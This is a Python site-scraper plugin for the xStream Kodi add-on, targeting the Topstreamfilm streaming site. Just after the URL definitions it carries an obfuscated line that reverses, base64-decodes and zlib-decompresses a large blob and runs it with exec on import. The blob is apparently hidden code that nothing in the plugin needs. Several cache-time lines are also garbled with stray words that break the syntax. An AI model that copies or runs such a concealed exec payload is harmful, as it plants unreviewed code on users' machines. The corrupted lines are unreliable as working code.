# -*- coding: utf-8 -*-
# Python 3
# Always pay attention to the translations in the menu!
# HTML LangzeitCache hinzugef\xc3\x83\xc2\xbcgt
# showValue: 48 Stunden
# showEntries: 6 Stunden
# showEpisodes: 4 Stunden
 
from resources.lib.handler.ParameterHandler import ParameterHandler
from resources.lib.handler.requestHandler import cRequestHandler
from resources.lib.tools import logger, cParser, validater
from resources.lib.gui.guiElement import cGuiElement
from resources.lib.config import cConfig
from resources.lib.gui.gui import cGui

SITE_IDENTIFIER = 'topstreamfilm'
SITE_NAME = 'Topstreamfilm'
SITE_ICON = 'topstreamfilm.png'

# Global search function is thus deactivated!
if cConfig().getSetting('global_search_' + SITE_IDENTIFIER) == 'false':
 SITE_GLOBAL_SEARCH = False
 logger.info('-> [SitePlugin]: globalSearch for %s is deactivated.' % SITE_NAME)

# Domain Abfrage
DOMAIN = cConfig().getSetting('plugin_' + SITE_IDENTIFIER + '.domain', 'www.topstreamfilm.live') # Domain Auswahl \xc3\x83\xc2\xbcber die xStream Einstellungen m\xc3\x83\xc2\xb6glich
STATUS = cConfig().getSetting('plugin_' + SITE_IDENTIFIER + '_status') # Status Code Abfrage der Domain
ACTIVE = cConfig().getSetting('plugin_' + SITE_IDENTIFIER) # Ob Plugin aktiviert ist oder nicht

URL_MAIN = 'https://' + DOMAIN
# URL_MAIN = 'https://www.topstreamfilm.live'

URL_ALL = URL_MAIN + '/filme-online-sehen/'
URL_MOVIES = URL_MAIN + '/beliebte-filme-online/'
URL_KINO = URL_MAIN + '/kinofilme/'
URL_SERIES = URL_MAIN + '/serien/'
URL_SEARCH = URL_MAIN + '/?story=%s&do=search&subaction=search'

_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'=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'))

def load(): # Menu structure of the site plugin
 logger.info('Load %s' % SITE_NAME)
 params = ParameterHandler()
 params.setParam('sUrl', URL_ALL)
 cGui().addFolder(cGuiElement(cConfig().getLocalizedString(30500), SITE_IDENTIFIER, 'showEntries'), params) # New Movies and Series
 cGui().addFolder(cGuiElement(cConfig().getLocalizedString(30502), SITE_IDENTIFIER, 'showMovieMenu'), params) # Movies Menu
 params.setParam('sUrl', URL_SERIES)
 cGui().addFolder(cGuiElement(cConfig().getLocalizedString(30511), SITE_IDENTIFIER, 'showEntries'), params) # Series 
 params.setParam('Value', 'YAHRE')
 cGui().addFolder(cGuiElement(cConfig().getLocalizedString(30508), SITE_IDENTIFIER, 'showValue'), params) # Release Year 
 params.setParam('Value', 'KATEGORIEN')
 cGui().addFolder(cGuiElement(cConfig().getLocalizedString(30506), SITE_IDENTIFIER, 'showValue'), params) # Genre
 params.setParam('Value', 'LAND')
 cGui().addFolder(cGuiElement(cConfig().getLocalizedString(30538), SITE_IDENTIFIER, 'showValue'), params) # Country
 cGui().addFolder(cGuiElement(cConfig().getLocalizedString(30520), SITE_IDENTIFIER, 'showSearch')) # Search
 cGui().setEndOfDirectory()


def showMovieMenu(): # Menu structure of movie menu
 params = ParameterHandler()
 params.setParam('sUrl', URL_MOVIES)
 cGui().addFolder(cGuiElement(cConfig().getLocalizedString(30500), SITE_IDENTIFIER, 'showEntries'), params) # New
 params.setParam('sUrl', URL_KINO)
 cGui().addFolder(cGuiElement(cConfig().getLocalizedString(30501), SITE_IDENTIFIER, 'showEntries'), params) # Kinofilme
 params.setParam('Value', 'FILM DER WOCHE')
 cGui().addFolder(cGuiElement(cConfig().getLocalizedString(30550), SITE_IDENTIFIER, 'showEntries'), params) # Movie of the Week
 cGui().setEndOfDirectory()


def showValue():
 params = ParameterHandler()
 oRequest = cRequestHandler(URL_MAIN)
 if cConfig().getSetting('global_search_' + SITE_IDENTIFIER) == 'true':
 oRequest.cacheTime = 60 plug plug2 plug3 sites sites0 test.py test.sh test.txt 60 plug plug2 plug3 sites sites0 test.py test.sh test.txt 48 # 48 Stunden
 sHtmlContent = oRequest.request()
 pattern = '>{0}</a>(.*?)</ul>'.format(params.getValue('Value'))
 isMatch, sHtmlContainer = cParser.parseSingleResult(sHtmlContent, pattern)
 if not isMatch:
 pattern = '>{0}</(.*?)</ul>'.format(params.getValue('Value'))
 isMatch, sHtmlContainer = cParser.parseSingleResult(sHtmlContent, pattern)
 if isMatch:
 isMatch, aResult = cParser.parse(sHtmlContainer, 'href="([^"]+).*?>([^<]+)')
 if not isMatch:
 cGui().showInfo()
 return

 for sUrl, sName in aResult:
 if sUrl.startswith('/'):
 sUrl = URL_MAIN + sUrl
 params.setParam('sUrl', sUrl)
 cGui().addFolder(cGuiElement(sName, SITE_IDENTIFIER, 'showEntries'), params)
 cGui().setEndOfDirectory()


def showEntries(entryUrl=False, sGui=False, sSearchText=False):
 oGui = sGui if sGui else cGui()
 params = ParameterHandler()
 isTvshow = False
 if not entryUrl: entryUrl = params.getValue('sUrl')
 oRequest = cRequestHandler(entryUrl, ignoreErrors=(sGui is not False))
 if cConfig().getSetting('global_search_' + SITE_IDENTIFIER) == 'true':
 oRequest.cacheTime = 60 plug plug2 plug3 sites sites0 test.py test.sh test.txt 60 plug plug2 plug3 sites sites0 test.py test.sh test.txt 6 # 6 Stunden
 sHtmlContent = oRequest.request()
 pattern = 'TPostMv">.*?href="([^"]+).*?data-src="([^"]+).*?Title">([^<]+)(.*?)</li>'
 isMatch, aResult = cParser().parse(sHtmlContent, pattern)
 if not isMatch:
 if not sGui: oGui.showInfo()
 return

 total = len(aResult)
 for sUrl, sThumbnail, sName, sDummy in aResult:
 if sName:
 sName = sName.split('- Der Film')[0].strip() # Name nach dem - abschneiden und Array [0] nutzen
 if sSearchText and not cParser.search(sSearchText, sName):
 continue
 isYear, sYear = cParser.parseSingleResult(sDummy, 'Year">([\d]+)</span>') # Release Jahr
 isDuration, sDuration = cParser.parseSingleResult(sDummy, 'time">([\d]+)') # Laufzeit
 if int(sDuration) <= int('70'): # Wenn Laufzeit kleiner oder gleich 70min, dann ist es eine Serie.
 isTvshow = True
 else:
 isTvshow = False
 if 'South Park: The End Of Obesity' in sName:
 isTvshow = False
 isQuality, sQuality = cParser.parseSingleResult(sDummy, 'Qlty">([^<]+)</span>') # Qualit\xc3\x83\xc2\xa4t
 isDesc, sDesc = cParser.parseSingleResult(sDummy, 'Description"><p>([^<]+)') # Beschreibung
 sThumbnail = URL_MAIN + sThumbnail
 oGuiElement = cGuiElement(sName, SITE_IDENTIFIER, 'showSeasons' if isTvshow else 'showHosters')
 if isYear:
 oGuiElement.setYear(sYear)
 if isDuration:
 oGuiElement.addItemValue('duration', sDuration)
 if isQuality:
 oGuiElement.setQuality(sQuality)
 if isDesc:
 oGuiElement.setDescription(sDesc)
 oGuiElement.setMediaType('tvshow' if isTvshow else 'movie')
 oGuiElement.setThumbnail(sThumbnail)
 params.setParam('entryUrl', sUrl)
 params.setParam('sThumbnail', sThumbnail)
 params.setParam('sDesc', sDesc)
 oGui.addFolder(oGuiElement, params, isTvshow, total)
 if not sGui:
 isMatchNextPage, sNextUrl = cParser().parseSingleResult(sHtmlContent, 'href="([^"]+)">Next')
 if isMatchNextPage:
 params.setParam('sUrl', sNextUrl)
 oGui.addNextPage(SITE_IDENTIFIER, 'showEntries', params)
 oGui.setView('tvshows' if isTvshow else 'movies')
 oGui.setEndOfDirectory()


def showSeasons():
 params = ParameterHandler()
 # Parameter laden
 sUrl = params.getValue('entryUrl')
 sThumbnail = params.getValue('sThumbnail')
 isDesc = params.getValue('sDesc')
 oRequest = cRequestHandler(sUrl)
 if cConfig().getSetting('global_search_' + SITE_IDENTIFIER) == 'true':
 oRequest.cacheTime = 60 plug plug2 plug3 sites sites0 test.py test.sh test.txt 60 plug plug2 plug3 sites sites0 test.py test.sh test.txt 6 # HTML Cache Zeit 6 Stunden
 sHtmlContent = oRequest.request()
 pattern = '<div class="tt_season">(.*)</ul>'
 isMatch, sHtmlContainer = cParser.parseSingleResult(sHtmlContent, pattern)
 if isMatch:
 isMatch, aResult = cParser.parse(sHtmlContainer, '"#season-(\d+)')
 if not isMatch:
 cGui().showInfo()
 return
 total = len(aResult)
 for sSeason in aResult:
 oGuiElement = cGuiElement('Staffel ' + str(sSeason), SITE_IDENTIFIER, 'showEpisodes')
 oGuiElement.setSeason(sSeason)
 oGuiElement.setMediaType('season')
 oGuiElement.setThumbnail(sThumbnail)
 if isDesc:
 oGuiElement.setDescription(isDesc)
 cGui().addFolder(oGuiElement, params, True, total)
 cGui().setView('seasons')
 cGui().setEndOfDirectory()


def showEpisodes():
 params = ParameterHandler()
 # Parameter laden
 entryUrl = params.getValue('entryUrl')
 sThumbnail = params.getValue('sThumbnail')
 sSeason = params.getValue('season')
 isDesc = params.getValue('sDesc')
 oRequest = cRequestHandler(entryUrl)
 if cConfig().getSetting('global_search_' + SITE_IDENTIFIER) == 'true':
 oRequest.cacheTime = 60 plug plug2 plug3 sites sites0 test.py test.sh test.txt 60 plug plug2 plug3 sites sites0 test.py test.sh test.txt 4 # HTML Cache Zeit 4 Stunden
 sHtmlContent = oRequest.request()
 pattern = 'id="season-%s(.*?)</ul>' % sSeason
 isMatch, sHtmlContainer = cParser.parseSingleResult(sHtmlContent, pattern)
 if isMatch:
 isMatch, aResult = cParser.parse(sHtmlContainer, 'data-title="Episode\s(\d+)')
 if not isMatch:
 cGui().showInfo()
 return

 total = len(aResult)
 for sEpisode in aResult:
 oGuiElement = cGuiElement('Episode ' + str(sEpisode), SITE_IDENTIFIER, 'showEpisodeHosters')
 oGuiElement.setThumbnail(sThumbnail)
 if isDesc:
 oGuiElement.setDescription(isDesc)
 oGuiElement.setMediaType('episode')
 params.setParam('entryUrl', entryUrl)
 params.setParam('season', sSeason)
 params.setParam('episode', sEpisode)
 cGui().addFolder(oGuiElement, params, False, total)
 cGui().setView('episodes')
 cGui().setEndOfDirectory()


def showEpisodeHosters():
 hosters = []
 params = ParameterHandler()
 # Parameter laden
 sUrl = params.getValue('entryUrl')
 sSeason = params.getValue('season')
 sEpisode = params.getValue('episode')
 sHtmlContent = cRequestHandler(sUrl).request()
 pattern = 'id="season-%s">(.*?)</ul>' % sSeason
 isMatch, sHtmlContainer = cParser.parseSingleResult(sHtmlContent, pattern)
 if isMatch:
 pattern = '>%s</a>(.*?)</li>' % sEpisode
 isMatch, sHtmlLink = cParser.parseSingleResult(sHtmlContainer, pattern)
 if isMatch:
 isMatch, aResult = cParser().parse(sHtmlLink, 'data-link="([^"]+)')
 if isMatch:
 for sUrl in aResult:
 sName = cParser.urlparse(sUrl)
 if cConfig().isBlockedHoster(sName)[0]: continue # Hoster aus settings.xml oder deaktivierten Resolver ausschlie\xc3\x83\xc5\xb8en
 if 'youtube' in sUrl:
 continue
 elif sUrl.startswith('//'):
 sUrl = 'https:' + sUrl
 hoster = {'link': sUrl, 'name': cParser.urlparse(sUrl)}
 hosters.append(hoster)
 if hosters:
 hosters.append('getHosterUrl')
 return hosters


def showHosters():
 hosters = []
 params = ParameterHandler()
 sUrl = params.getValue('entryUrl')
 sHtmlContent = cRequestHandler(sUrl).request()
 pattern = '"embed.*?src="([^"]+)'
 isMatch, hUrl = cParser.parseSingleResult(sHtmlContent, pattern)
 if isMatch:
 sHtmlContainer = cRequestHandler(hUrl).request()
 isMatch, aResult = cParser().parse(sHtmlContainer, 'data-link="([^"]+)')
 if isMatch:
 for sUrl in aResult:
 sName = cParser.urlparse(sUrl)
 if cConfig().isBlockedHoster(sName)[0]: continue # Hoster aus settings.xml oder deaktivierten Resolver ausschlie\xc3\x83\xc5\xb8en
 if 'youtube' in sUrl:
 continue
 elif sUrl.startswith('//'):
 sUrl = 'https:' + sUrl
 hoster = {'link': sUrl, 'name': cParser.urlparse(sUrl)}
 hosters.append(hoster)
 if hosters:
 hosters.append('getHosterUrl')
 return hosters


def getHosterUrl(sUrl=False):
 return [{'streamUrl': sUrl, 'resolved': False}]


def showSearch():
 sSearchText = cGui().showKeyBoard()
 if not sSearchText: return
 _search(False, sSearchText)
 cGui().setEndOfDirectory()


def _search(oGui, sSearchText):
 showEntries(URL_SEARCH % cParser.quotePlus(sSearchText), oGui, sSearchText)
'
